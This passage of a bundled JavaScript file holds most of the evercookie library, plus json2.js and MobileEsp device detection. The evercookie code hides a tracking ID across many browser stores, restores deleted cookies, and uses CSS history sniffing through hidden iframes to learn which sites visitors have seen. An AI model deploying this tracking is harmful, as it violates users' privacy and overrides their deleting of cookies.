			// http cookie so the php will force a cached response
			var origvalue = this.getFromStr('evercookie_png', document.cookie);
			document.cookie = 'evercookie_png=; expires=Mon, 20 Sep 2010 00:00:00 UTC; path=/';

			var img = new Image();
			img.style.visibility = 'hidden';
			img.style.position = 'absolute';
			img.src = 'evercookie_png.php?name=' + name;
			
			img.onload = function()
			{
				// put our cookie back
				document.cookie = 'evercookie_png=' + origvalue + '; expires=Tue, 31 Dec 2030 00:00:00 UTC; path=/';

				self._ec.pngData = '';
				ctx.drawImage(img,0,0);

				// get CanvasPixelArray from  given coordinates and dimensions
				var imgd = ctx.getImageData(0, 0, 200, 1);
				var pix = imgd.data;

				// loop over each pixel to get the "RGB" values (ignore alpha)
				for (var i = 0, n = pix.length; i < n; i += 4)
				{
					if (pix[i  ] == 0) break;
					self._ec.pngData += String.fromCharCode(pix[i]);
					if (pix[i+1] == 0) break;
					self._ec.pngData += String.fromCharCode(pix[i+1]);
					if (pix[i+2] == 0) break;
					self._ec.pngData += String.fromCharCode(pix[i+2]);
				}
			}	
		}
	}
}

this.evercookie_local_storage = function(name, value)
{
	try
	{
		if (window.localStorage)
		{
			if (typeof(value) != "undefined")
				localStorage.setItem(name, value);
			else
				return localStorage.getItem(name);
		}
	}
	catch (e) { }
}

this.evercookie_database_storage = function(name, value)
{
	try
	{
		if (window.openDatabase)
		{		
			var database = window.openDatabase("sqlite_evercookie", "", "evercookie", 1024 * 1024);

			if (typeof(value) != "undefined")
				database.transaction(function(tx)
				{
					tx.executeSql("CREATE TABLE IF NOT EXISTS cache(" +
						"id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, " +
						"name TEXT NOT NULL, " +
						"value TEXT NOT NULL, " +
						"UNIQUE (name)" + 
					")", [], function (tx, rs) { }, function (tx, err) { });

					tx.executeSql("INSERT OR REPLACE INTO cache(name, value) VALUES(?, ?)", [name, value],
						function (tx, rs) { }, function (tx, err) { })
				});
			else
			{
				database.transaction(function(tx)
				{
					tx.executeSql("SELECT value FROM cache WHERE name=?", [name],
					function(tx, result1) {
						if (result1.rows.length >= 1)
							self._ec.dbData = result1.rows.item(0)['value'];
						else
							self._ec.dbData = '';
					}, function (tx, err) { })
				});
			}
		}
	} catch(e) { }
}

this.evercookie_session_storage = function(name, value)
{
	try
	{
		if (window.sessionStorage)
		{
			if (typeof(value) != "undefined")
				sessionStorage.setItem(name, value);
			else
				return sessionStorage.getItem(name);
		}
	} catch(e) { }
}

this.evercookie_global_storage = function(name, value)
{
	if (window.globalStorage)
	{
		var host = this.getHost();

		try
		{
			if (typeof(value) != "undefined")
				eval("globalStorage[host]." + name + " = value");
			else
				return eval("globalStorage[host]." + name);
		} catch(e) { }
	}
}
this.evercookie_silverlight = function(name, value) {
    /*
     * Create silverlight embed
     * 
     * Ok. so, I tried doing this the proper dom way, but IE chokes on appending anything in object tags (including params), so this
     * is the best method I found. Someone really needs to find a less hack-ish way. I hate the look of this shit.
    */
        var source = "evercookie.xap";
        var minver = "4.0.50401.0";
        
        var initParam = "";
        if(typeof(value) != "undefined")
            initParam = '<param name="initParams" value="'+name+'='+value+'" />';
        
        var html =
        '<object data="data:application/x-silverlight-2," type="application/x-silverlight-2" id="mysilverlight" width="0" height="0">' +
            initParam +
            '<param name="source" value="'+source+'"/>' +
            '<param name="onLoad" value="onSilverlightLoad"/>' +
            '<param name="onError" value="onSilverlightError"/>' +
            '<param name="background" value="Transparent"/>' +
            '<param name="windowless" value="true"/>' +
            '<param name="minRuntimeVersion" value="'+minver+'"/>' +
            '<param name="autoUpgrade" value="true"/>' +
            '<a href="http://go.microsoft.com/fwlink/?LinkID=149156&v='+minver+'" style="text-decoration:none">' +
              '<img src="http://go.microsoft.com/fwlink/?LinkId=108181" alt="Get Microsoft Silverlight" style="border-style:none"/>' +
            '</a>' +
        '</object>';
        document.body.innerHTML+=html;
}

// public method for encoding
this.encode = function (input) {
	var output = "";
	var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
	var i = 0;

	input = this._utf8_encode(input);

	while (i < input.length) {

		chr1 = input.charCodeAt(i++);
		chr2 = input.charCodeAt(i++);
		chr3 = input.charCodeAt(i++);

		enc1 = chr1 >> 2;
		enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
		enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
		enc4 = chr3 & 63;

		if (isNaN(chr2)) {
			enc3 = enc4 = 64;
		} else if (isNaN(chr3)) {
			enc4 = 64;
		}

		output = output +
		_baseKeyStr.charAt(enc1) + _baseKeyStr.charAt(enc2) +
		_baseKeyStr.charAt(enc3) + _baseKeyStr.charAt(enc4);

	}

	return output;
}

// public method for decoding
this.decode = function (input) {
	var output = "";
	var chr1, chr2, chr3;
	var enc1, enc2, enc3, enc4;
	var i = 0;

	input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

	while (i < input.length) {
		enc1 = _baseKeyStr.indexOf(input.charAt(i++));
		enc2 = _baseKeyStr.indexOf(input.charAt(i++));
		enc3 = _baseKeyStr.indexOf(input.charAt(i++));
		enc4 = _baseKeyStr.indexOf(input.charAt(i++));

		chr1 = (enc1 << 2) | (enc2 >> 4);
		chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
		chr3 = ((enc3 & 3) << 6) | enc4;

		output = output + String.fromCharCode(chr1);

		if (enc3 != 64) {
			output = output + String.fromCharCode(chr2);
		}
		if (enc4 != 64) {
			output = output + String.fromCharCode(chr3);
		}

	}

	output = this._utf8_decode(output);

	return output;

}

// private method for UTF-8 encoding
this._utf8_encode = function (string) {
	string = string.replace(/\r\n/g,"\n");
	var utftext = "";

	for (var n = 0; n < string.length; n++) {

		var c = string.charCodeAt(n);

		if (c < 128) {
			utftext += String.fromCharCode(c);
		}
		else if((c > 127) && (c < 2048)) {
			utftext += String.fromCharCode((c >> 6) | 192);
			utftext += String.fromCharCode((c & 63) | 128);
		}
		else {
			utftext += String.fromCharCode((c >> 12) | 224);
			utftext += String.fromCharCode(((c >> 6) & 63) | 128);
			utftext += String.fromCharCode((c & 63) | 128);
		}

	}

	return utftext;
}

// private method for UTF-8 decoding
this._utf8_decode = function (utftext) {
	var string = "";
	var i = 0;
	var c = c1 = c2 = 0;

	while ( i < utftext.length ) {

		c = utftext.charCodeAt(i);

		if (c < 128) {
			string += String.fromCharCode(c);
			i++;
		}
		else if((c > 191) && (c < 224)) {
			c2 = utftext.charCodeAt(i+1);
			string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
			i += 2;
		}
		else {
			c2 = utftext.charCodeAt(i+1);
			c3 = utftext.charCodeAt(i+2);
			string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
			i += 3;
		}

	}

	return string;
}

// this is crazy but it's 4am in dublin and i thought this would be hilarious
// blame the guinness
this.evercookie_history = function(name, value)
{
	// - is special
	var baseStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=-";
	var baseElems = baseStr.split("");
	
	// sorry google.
	var url = 'http://www.google.com/evercookie/cache/' + this.getHost() + '/' + name;

	if (typeof(value) != "undefined")
	{
		// don't reset this if we already have it set once
		// too much data and you can't clear previous values
		if (this.hasVisited(url))
			return;

		this.createIframe(url, 'if');
		url = url + '/';

		var base = this.encode(value).split("");
		for (var i = 0; i < base.length; i++)
		{
			url = url + base[i];
			this.createIframe(url, 'if' + i);
		}

		// - signifies the end of our data
		url = url + '-';
		this.createIframe(url, 'if_');
	}
	else
	{
		// omg you got csspwn3d
		if (this.hasVisited(url))
		{
			url = url + '/';

			var letter = "";
			var val = "";
			var found = 1;
			while (letter != '-' && found == 1)
			{
				found = 0;
				for (var i = 0; i < baseElems.length; i++)
				{
					if (this.hasVisited(url + baseElems[i]))
					{
						letter = baseElems[i];
						if (letter != '-')
							val = val + letter;
						url = url + letter;
						found = 1;
						break;
					}
				}
			}
			
			// lolz
			return this.decode(val);
		}
	}
}

this.createElem = function(type, name, append)
{
	var el;
	if (typeof name != 'undefined' && document.getElementById(name))
		el = document.getElementById(name);
	else
		el = document.createElement(type);
	el.style.visibility = 'hidden';
	el.style.position = 'absolute';

	if (name)
		el.setAttribute('id', name);

	if (append)
		document.body.appendChild(el);

	return el;
}

this.createIframe = function(url, name)
{
	var el = this.createElem('iframe', name, 1);
	el.setAttribute('src', url);
	return el;
}

// wait for our swfobject to appear (swfobject.js to load)
this.waitForSwf = function(i)
{
	if (typeof i == 'undefined')
		i = 0;
	else
		i++;

	// wait for ~2 seconds for swfobject to appear
	if (i < _ec_tests && typeof swfobject == 'undefined')
		setTimeout(function() { waitForSwf(i) }, 300);
}

this.evercookie_cookie = function(name, value)
{
	if (typeof(value) != "undefined")
	{
		// expire the cookie first
		document.cookie = name + '=; expires=Mon, 20 Sep 2010 00:00:00 UTC; path=/';
		document.cookie = name + '=' + value + '; expires=Tue, 31 Dec 2030 00:00:00 UTC; path=/';
	}
	else
		return this.getFromStr(name, document.cookie);
}

// get value from param-like string (eg, "x=y&name=VALUE")
this.getFromStr = function(name, text)
{
	if (typeof text != 'string')
		return;
		
	var nameEQ = name + "=";
	var ca = text.split(/[;&]/);
	for (var i = 0; i < ca.length; i++)
	{
		var c = ca[i];
		while (c.charAt(0) == ' ')
			c = c.substring(1, c.length);
		if (c.indexOf(nameEQ) == 0)
			return c.substring(nameEQ.length, c.length);
	}
}

this.getHost = function()
{
	var domain = document.location.host;
	if (domain.indexOf('www.') == 0)
		domain = domain.replace('www.', '');
	return domain;
}

this.toHex = function(str)
{
    var r = "";
    var e = str.length;
    var c = 0;
    var h;
    while (c < e)
    {
        h = str.charCodeAt(c++).toString(16);
        while (h.length < 2)
        	h = "0" + h;
        r += h;
    }
    return r;
}

this.fromHex = function(str)
{
    var r = "";
    var e = str.length;
    var s;
    while (e >= 0)
    {
        s = e - 2;
        r = String.fromCharCode("0x" + str.substring(s, e)) + r;
        e = s;
    }
    return r;
}

/* 
 * css history knocker (determine what sites your visitors have been to)
 *
 * originally by Jeremiah Grossman
 * http://jeremiahgrossman.blogspot.com/2006/08/i-know-where-youve-been.html
 *
 * ported to additional browsers by Samy Kamkar
 *
 * compatible with ie6, ie7, ie8, ff1.5, ff2, ff3, opera, safari, chrome, flock
 *
 * - code@samy.pl
 */


this.hasVisited = function(url)
{
	if (this.no_color == -1)
	{
		var no_style = this._getRGB("http://samy-was-here-this-should-never-be-visited.com", -1);
		if (no_style == -1)
			this.no_color =
				this._getRGB("http://samy-was-here-"+Math.floor(Math.random()*9999999)+"rand.com");
	}
	
	// did we give full url?
	if (url.indexOf('https:') == 0 || url.indexOf('http:') == 0)
		return this._testURL(url, this.no_color);
		
	// if not, just test a few diff types	if (exact)
	return	this._testURL("http://" + url, this.no_color) ||
		this._testURL("https://" + url, this.no_color) ||
		this._testURL("http://www." + url, this.no_color) ||
		this._testURL("https://www." + url, this.no_color);
}

/* create our anchor tag */
var _link = this.createElem('a', '_ec_rgb_link');

/* for monitoring */
var created_style;

/* create a custom style tag for the specific link. Set the CSS visited selector to a known value */
var _cssText = '#_ec_rgb_link:visited{display:none;color:#FF0000}';

/* Methods for IE6, IE7, FF, Opera, and Safari */
try {
	created_style = 1;
	var style = document.createElement('style');
	if (style.styleSheet)
		style.styleSheet.innerHTML = _cssText;
	else if (style.innerHTML)
		style.innerHTML = _cssText;
	else
	{
		var cssT = document.createTextNode(_cssText);
		style.appendChild(cssT);
	}
} catch (e) {
	created_style = 0;
}

/* if test_color, return -1 if we can't set a style */
this._getRGB = function(u, test_color)
{
	if (test_color && created_style == 0)
		return -1;

	/* create the new anchor tag with the appropriate URL information */
	_link.href = u;
	_link.innerHTML = u;
	// not sure why, but the next two appendChilds always have to happen vs just once
	document.body.appendChild(style);
	document.body.appendChild(_link);
	
	/* add the link to the DOM and save the visible computed color */
	var color;
	if (document.defaultView)
		color = document.defaultView.getComputedStyle(_link, null).getPropertyValue('color');
	else
		color = _link.currentStyle['color'];

	return color;
}

this._testURL = function(url, no_color)
{
	var color = this._getRGB(url);

	/* check to see if the link has been visited if the computed color is red */
	if (color == "rgb(255, 0, 0)" || color == "#ff0000")
		return 1;

	/* if our style trick didn't work, just compare default style colors */
	else if (no_color && color != no_color)
		return 1;

	/* not found */
	return 0;
}

};

return _class;
})();


/*
 * Again, ugly workaround....same problem as flash.
*/
var _global_isolated;
function onSilverlightLoad(sender, args) {
    var control = sender.getHost();
    _global_isolated = control.Content.App.getIsolatedStorage();
}

function onSilverlightError(sender, args) {
    _global_isolated = "";
}


/*
json2.js
2014-02-04

Public Domain.

NO WARRANTY EXPRESSED OR IMPLIED. USE AT YOUR OWN RISK.

See http://www.JSON.org/js.html


This code should be minified before deployment.
See http://javascript.crockford.com/jsmin.html
*/
//Create a JSON object only if one does not already exist. We create the
//methods in a closure to avoid creating global variables.

if (typeof JSON !== 'object') {
 JSON = {};
}

(function () {
 'use strict';

 function f(n) {
     // Format integers to have at least two digits.
     return n < 10 ? '0' + n : n;
 }

 if (typeof Date.prototype.toJSON !== 'function') {

     Date.prototype.toJSON = function () {

         return isFinite(this.valueOf())
             ? this.getUTCFullYear()     + '-' +
                 f(this.getUTCMonth() + 1) + '-' +
                 f(this.getUTCDate())      + 'T' +
                 f(this.getUTCHours())     + ':' +
                 f(this.getUTCMinutes())   + ':' +
                 f(this.getUTCSeconds())   + 'Z'
             : null;
     };

     String.prototype.toJSON      =
         Number.prototype.toJSON  =
         Boolean.prototype.toJSON = function () {
             return this.valueOf();
         };
 }

 var cx,
     escapable,
     gap,
     indent,
     meta,
     rep;


 function quote(string) {

//If the string contains no control characters, no quote characters, and no
//backslash characters, then we can safely slap some quotes around it.
//Otherwise we must also replace the offending characters with safe escape
//sequences.

     escapable.lastIndex = 0;
     return escapable.test(string) ? '"' + string.replace(escapable, function (a) {
         var c = meta[a];
         return typeof c === 'string'
             ? c
             : '\\u' + ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
     }) + '"' : '"' + string + '"';
 }


 function str(key, holder) {

//Produce a string from holder[key].

     var i,          // The loop counter.
         k,          // The member key.
         v,          // The member value.
         length,
         mind = gap,
         partial,
         value = holder[key];

//If the value has a toJSON method, call it to obtain a replacement value.

     if (value && typeof value === 'object' &&
             typeof value.toJSON === 'function') {
         value = value.toJSON(key);
     }

//If we were called with a replacer function, then call the replacer to
//obtain a replacement value.

     if (typeof rep === 'function') {
         value = rep.call(holder, key, value);
     }

//What happens next depends on the value's type.

     switch (typeof value) {
     case 'string':
         return quote(value);

     case 'number':

//JSON numbers must be finite. Encode non-finite numbers as null.

         return isFinite(value) ? String(value) : 'null';

     case 'boolean':
     case 'null':

//If the value is a boolean or null, convert it to a string. Note:
//typeof null does not produce 'null'. The case is included here in
//the remote chance that this gets fixed someday.

         return String(value);

//If the type is 'object', we might be dealing with an object or an array or
//null.

     case 'object':

//Due to a specification blunder in ECMAScript, typeof null is 'object',
//so watch out for that case.

         if (!value) {
             return 'null';
         }

//Make an array to hold the partial results of stringifying this object value.

         gap += indent;
         partial = [];

//Is the value an array?

         if (Object.prototype.toString.apply(value) === '[object Array]') {

//The value is an array. Stringify every element. Use null as a placeholder
//for non-JSON values.

             length = value.length;
             for (i = 0; i < length; i += 1) {
                 partial[i] = str(i, value) || 'null';
             }

//Join all of the elements together, separated with commas, and wrap them in
//brackets.

             v = partial.length === 0
                 ? '[]'
                 : gap
                 ? '[\n' + gap + partial.join(',\n' + gap) + '\n' + mind + ']'
                 : '[' + partial.join(',') + ']';
             gap = mind;
             return v;
         }

//If the replacer is an array, use it to select the members to be stringified.

         if (rep && typeof rep === 'object') {
             length = rep.length;
             for (i = 0; i < length; i += 1) {
                 if (typeof rep[i] === 'string') {
                     k = rep[i];
                     v = str(k, value);
                     if (v) {
                         partial.push(quote(k) + (gap ? ': ' : ':') + v);
                     }
                 }
             }
         } else {

//Otherwise, iterate through all of the keys in the object.

             for (k in value) {
                 if (Object.prototype.hasOwnProperty.call(value, k)) {
                     v = str(k, value);
                     if (v) {
                         partial.push(quote(k) + (gap ? ': ' : ':') + v);
                     }
                 }
             }
         }

//Join all of the member texts together, separated with commas,
//and wrap them in braces.

         v = partial.length === 0
             ? '{}'
             : gap
             ? '{\n' + gap + partial.join(',\n' + gap) + '\n' + mind + '}'
             : '{' + partial.join(',') + '}';
         gap = mind;
         return v;
     }
 }

//If the JSON object does not yet have a stringify method, give it one.

 if (typeof JSON.stringify !== 'function') {
     escapable = /[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g;
     meta = {    // table of character substitutions
         '\b': '\\b',
         '\t': '\\t',
         '\n': '\\n',
         '\f': '\\f',
         '\r': '\\r',
         '"' : '\\"',
         '\\': '\\\\'
     };
     JSON.stringify = function (value, replacer, space) {

//The stringify method takes a value and an optional replacer, and an optional
//space parameter, and returns a JSON text. The replacer can be a function
//that can replace values, or an array of strings that will select the keys.
//A default replacer method can be provided. Use of the space parameter can
//produce text that is more easily readable.

         var i;
         gap = '';
         indent = '';

//If the space parameter is a number, make an indent string containing that
//many spaces.

         if (typeof space === 'number') {
             for (i = 0; i < space; i += 1) {
                 indent += ' ';
             }

//If the space parameter is a string, it will be used as the indent string.

         } else if (typeof space === 'string') {
             indent = space;
         }

//If there is a replacer, it must be a function or an array.
//Otherwise, throw an error.

         rep = replacer;
         if (replacer && typeof replacer !== 'function' &&
                 (typeof replacer !== 'object' ||
                 typeof replacer.length !== 'number')) {
             throw new Error('JSON.stringify');
         }

//Make a fake root object containing our value under the key of ''.
//Return the result of stringifying the value.

         return str('', {'': value});
     };
 }


//If the JSON object does not yet have a parse method, give it one.

 if (typeof JSON.parse !== 'function') {
     cx = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g;
     JSON.parse = function (text, reviver) {

//The parse method takes a text and an optional reviver function, and returns
//a JavaScript value if the text is a valid JSON text.

         var j;

         function walk(holder, key) {

//The walk method is used to recursively walk the resulting structure so
//that modifications can be made.

             var k, v, value = holder[key];
             if (value && typeof value === 'object') {
                 for (k in value) {
                     if (Object.prototype.hasOwnProperty.call(value, k)) {
                         v = walk(value, k);
                         if (v !== undefined) {
                             value[k] = v;
                         } else {
                             delete value[k];
                         }
                     }
                 }
             }
             return reviver.call(holder, key, value);
         }


//Parsing happens in four stages. In the first stage, we replace certain
//Unicode characters with escape sequences. JavaScript handles many characters
//incorrectly, either silently deleting them, or treating them as line endings.

         text = String(text);
         cx.lastIndex = 0;
         if (cx.test(text)) {
             text = text.replace(cx, function (a) {
                 return '\\u' +
                     ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
             });
         }

//In the second stage, we run the text against regular expressions that look
//for non-JSON patterns. We are especially concerned with '()' and 'new'
//because they can cause invocation, and '=' because it can cause mutation.
//But just to be safe, we want to reject all unexpected forms.

//We split the second stage into 4 regexp operations in order to work around
//crippling inefficiencies in IE's and Safari's regexp engines. First we
//replace the JSON backslash pairs with '@' (a non-JSON character). Second, we
//replace all simple value tokens with ']' characters. Third, we delete all
//open brackets that follow a colon or comma or that begin the text. Finally,
//we look to see that the remaining characters are only whitespace or ']' or
//',' or ':' or '{' or '}'. If that is so, then the text is safe for eval.

         if (/^[\],:{}\s]*$/
                 .test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, '@')
                     .replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, ']')
                     .replace(/(?:^|:|,)(?:\s*\[)+/g, ''))) {

//In the third stage we use the eval function to compile the text into a
//JavaScript structure. The '{' operator is subject to a syntactic ambiguity
//in JavaScript: it can begin a block or an object literal. We wrap the text
//in parens to eliminate the ambiguity.

             j = eval('(' + text + ')');

//In the optional fourth stage, we recursively walk the new structure, passing
//each name/value pair to a reviver function for possible transformation.

             return typeof reviver === 'function'
                 ? walk({'': j}, '')
                 : j;
         }

//If the text is not JSON parseable, then a SyntaxError is thrown.

         throw new SyntaxError('JSON.parse');
     };
 }
}());


/**
*
*  detect the device
**/


var MobileEsp = {

        //GLOBALLY USEFUL VARIABLES
        //Note: These values are set automatically during the Init function.
        //Stores whether we're currently initializing the most popular functions.
        initCompleted : false,
        isWebkit : false, //Stores the result of DetectWebkit()
        isMobilePhone : false, //Stores the result of DetectMobileQuick()
        isIphone : false, //Stores the result of DetectIphone()
        isAndroid : false, //Stores the result of DetectAndroid()
        isAndroidPhone : false, //Stores the result of DetectAndroidPhone()
        isTierTablet : false, //Stores the result of DetectTierTablet()
        isTierIphone : false, //Stores the result of DetectTierIphone()
        isTierRichCss : false, //Stores the result of DetectTierRichCss()
        isTierGenericMobile : false, //Stores the result of DetectTierOtherPhones()
       
        //INTERNALLY USED DETECTION STRING VARIABLES
        engineWebKit : 'webkit',

        deviceIphone : 'iphone',
        deviceIpod : 'ipod',
        deviceIpad : 'ipad',
        deviceMacPpc : 'macintosh', //Used for disambiguation
       
        deviceAndroid : 'android',
        deviceGoogleTV : 'googletv',
        deviceHtcFlyer : 'htc_flyer', //HTC Flyer
       
        deviceWinPhone7 : 'windows phone os 7',
        deviceWinPhone8 : 'windows phone 8',
        deviceWinMob : 'windows ce',
        deviceWindows : 'windows',
        deviceIeMob : 'iemobile',
        devicePpc : 'ppc', //Stands for PocketPC
        enginePie : 'wm5 pie',  //An old Windows Mobile

        deviceBB : 'blackberry',
        deviceBB10 : 'bb10', //For the new BB 10 OS
        vndRIM : 'vnd.rim', //Detectable when BB devices emulate IE or Firefox
        deviceBBStorm : 'blackberry95', //Storm 1 and 2
        deviceBBBold : 'blackberry97', //Bold 97x0 (non-touch)
        deviceBBBoldTouch : 'blackberry 99', //Bold 99x0 (touchscreen)
        deviceBBTour : 'blackberry96', //Tour
        deviceBBCurve : 'blackberry89', //Curve 2
        deviceBBCurveTouch : 'blackberry 938', //Curve Touch 9380
        deviceBBTorch : 'blackberry 98', //Torch
        deviceBBPlaybook : 'playbook', //PlayBook tablet

        deviceSymbian : 'symbian',
        deviceSymbos : 'symbos', //Opera 10 on Symbian
        deviceS60 : 'series60',
        deviceS70 : 'series70',
        deviceS80 : 'series80',
        deviceS90 : 'series90',

        devicePalm : 'palm',
        deviceWebOS : 'webos', //For Palm's line of WebOS devices
        deviceWebOShp : 'hpwos', //For HP's line of WebOS devices
        engineBlazer : 'blazer', //Old Palm browser
        engineXiino : 'xiino', //Another old Palm

        deviceNuvifone : 'nuvifone', //Garmin Nuvifone
        deviceBada : 'bada', //Samsung's Bada OS
        deviceTizen : 'tizen', //Tizen OS
        deviceMeego : 'meego', //Meego OS

        deviceKindle : 'kindle', //Amazon eInk Kindle
        engineSilk : 'silk-accelerated', //Amazon's accelerated Silk browser for Kindle Fire

        //Initialize variables for mobile-specific content.
        vndwap : 'vnd.wap',
        wml : 'wml',
       
        //Initialize variables for random devices and mobile browsers.
        //Some of these may not support JavaScript
        deviceTablet : 'tablet',
        deviceBrew : 'brew',
        deviceDanger : 'danger',
        deviceHiptop : 'hiptop',
        devicePlaystation : 'playstation',
        devicePlaystationVita : 'vita',
        deviceNintendoDs : 'nitro',
        deviceNintendo : 'nintendo',
        deviceWii : 'wii',
        deviceXbox : 'xbox',
        deviceArchos : 'archos',
       
        engineOpera : 'opera', //Popular browser
        engineNetfront : 'netfront', //Common embedded OS browser
        engineUpBrowser : 'up.browser', //common on some phones
        engineOpenWeb : 'openweb', //Transcoding by OpenWave server
        deviceMidp : 'midp', //a mobile Java technology
        uplink : 'up.link',
        engineTelecaQ : 'teleca q', //a modern feature phone browser
        engineObigo : 'obigo', //W 10 is a modern feature phone browser
       
        devicePda : 'pda',
        mini : 'mini',  //Some mobile browsers put 'mini' in their names
        mobile : 'mobile', //Some mobile browsers put 'mobile' in their user agent strings
        mobi : 'mobi', //Some mobile browsers put 'mobi' in their user agent strings
       
        //Use Maemo, Tablet, and Linux to test for Nokia's Internet Tablets.
        maemo : 'maemo',
        linux : 'linux',
        mylocom2 : 'sony/com', // for Sony Mylo 1 and 2
       
        //In some UserAgents, the only clue is the manufacturer
        manuSonyEricsson : 'sonyericsson',
        manuericsson : 'ericsson',
        manuSamsung1 : 'sec-sgh',
        manuSony : 'sony',
        manuHtc : 'htc',
       
        //In some UserAgents, the only clue is the operator
        svcDocomo : 'docomo',
        svcKddi : 'kddi',
        svcVodafone : 'vodafone',
       
        //Disambiguation strings.
        disUpdate : 'update', //pda vs. update
       
        //Holds the User Agent string value.
        uagent : '',
   
        //Initializes key MobileEsp variables
        InitDeviceScan : function() {
                this.initCompleted = false;
               
                if (navigator && navigator.userAgent)
                        this.uagent = navigator.userAgent.toLowerCase();
               
                //Save these properties to speed processing
                this.isWebkit = this.DetectWebkit();
                this.isIphone = this.DetectIphone();
                this.isAndroid = this.DetectAndroid();
                this.isAndroidPhone = this.DetectAndroidPhone();
               
                //Generally, these tiers are the most useful for web development
                this.isTierIphone = this.DetectTierIphone(); //Do first
                this.isTierTablet = this.DetectTierTablet(); //Do second
                this.isMobilePhone = this.DetectMobileQuick(); //Do third
               
                //Optional: Comment these out if you NEVER use them
                this.isTierRichCss = this.DetectTierRichCss();
                this.isTierGenericMobile = this.DetectTierOtherPhones();
               
                this.initCompleted = true;
        },


        //APPLE IOS

        //**************************
        // Detects if the current device is an iPhone.
        DetectIphone : function() {
                if (this.initCompleted || this.isIphone)
                        return this.isIphone;

                if (this.uagent.search(this.deviceIphone) > -1)
                        {
                                //The iPad and iPod Touch say they're an iPhone! So let's disambiguate.
                                if (this.DetectIpad() || this.DetectIpod())
                                        return false;
                                //Yay! It's an iPhone!
                                else
                                        return true;
                        }
                else
                        return false;
        },

        //**************************
        // Detects if the current device is an iPod Touch.
        DetectIpod : function() {
                        if (this.uagent.search(this.deviceIpod) > -1)
                                return true;
                        else
                                return false;
        },

        //**************************
        // Detects if the current device is an iPhone or iPod Touch.
        DetectIphoneOrIpod : function() {
                //We repeat the searches here because some iPods
                //  may report themselves as an iPhone, which is ok.
                if (this.DetectIphone() || this.DetectIpod())
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current device is an iPad tablet.
        DetectIpad : function() {
                if (this.uagent.search(this.deviceIpad) > -1  && this.DetectWebkit())
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects *any* iOS device: iPhone, iPod Touch, iPad.
        DetectIos : function() {
                if (this.DetectIphoneOrIpod() || this.DetectIpad())
                        return true;
                else
                        return false;
        },


        //ANDROID

        //**************************
        // Detects *any* Android OS-based device: phone, tablet, and multi-media player.
        // Also detects Google TV.
        DetectAndroid : function() {
                if (this.initCompleted || this.isAndroid)
                        return this.isAndroid;
               
                if ((this.uagent.search(this.deviceAndroid) > -1) || this.DetectGoogleTV())
                        return true;
                //Special check for the HTC Flyer 7" tablet. It should report here.
                if (this.uagent.search(this.deviceHtcFlyer) > -1)
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current device is a (small-ish) Android OS-based device
        // used for calling and/or multi-media (like a Samsung Galaxy Player).
        // Google says these devices will have 'Android' AND 'mobile' in user agent.
        // Ignores tablets (Honeycomb and later).
        DetectAndroidPhone : function() {
                if (this.initCompleted || this.isAndroidPhone)
                        return this.isAndroidPhone;
               
                if (this.DetectAndroid() && (this.uagent.search(this.mobile) > -1))
                        return true;
                //Special check for Android phones with Opera Mobile. They should report here.
                if (this.DetectOperaAndroidPhone())
                        return true;
                //Special check for the HTC Flyer 7" tablet. It should report here.
                if (this.uagent.search(this.deviceHtcFlyer) > -1)
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current device is a (self-reported) Android tablet.
        // Google says these devices will have 'Android' and NOT 'mobile' in their user agent.
        DetectAndroidTablet : function() {
                //First, let's make sure we're on an Android device.
                if (!this.DetectAndroid())
                        return false;
               
                //Special check for Opera Android Phones. They should NOT report here.
                if (this.DetectOperaMobile())
                        return false;
                //Special check for the HTC Flyer 7" tablet. It should NOT report here.
                if (this.uagent.search(this.deviceHtcFlyer) > -1)
                        return false;
                       
                //Otherwise, if it's Android and does NOT have 'mobile' in it, Google says it's a tablet.
                if (this.uagent.search(this.mobile) > -1)
                        return false;
                else
                        return true;
        },

        //**************************
        // Detects if the current device is an Android OS-based device and
        //   the browser is based on WebKit.
        DetectAndroidWebKit : function() {
                if (this.DetectAndroid() && this.DetectWebkit())
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current device is a GoogleTV.
        DetectGoogleTV : function() {
                if (this.uagent.search(this.deviceGoogleTV) > -1)
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current browser is based on WebKit.
        DetectWebkit : function() {
                if (this.initCompleted || this.isWebkit)
                        return this.isWebkit;
               
                if (this.uagent.search(this.engineWebKit) > -1)
                        return true;
                else
                        return false;
        },


        //WINDOWS MOBILE AND PHONE

        // Detects if the current browser is EITHER a
        // Windows Phone 7.x OR 8 device.
        DetectWindowsPhone : function() {
                if (this.DetectWindowsPhone7() ||
                    this.DetectWindowsPhone8())
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects a Windows Phone 7.x device (in mobile browsing mode).
        DetectWindowsPhone7 : function() {
                if (this.uagent.search(this.deviceWinPhone7) > -1)
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects a Windows Phone 8 device (in mobile browsing mode).
        DetectWindowsPhone8 : function() {
                if (this.uagent.search(this.deviceWinPhone8) > -1)
                        return true;
                else
                        return false;
        },

        //**************************
        // Detects if the current browser is a Windows Mobile device.
        // Excludes Windows Phone 7 and later devices.
        // Focuses on Windows Mobile 6.xx and earlier.
        DetectWindowsMobile : function() {
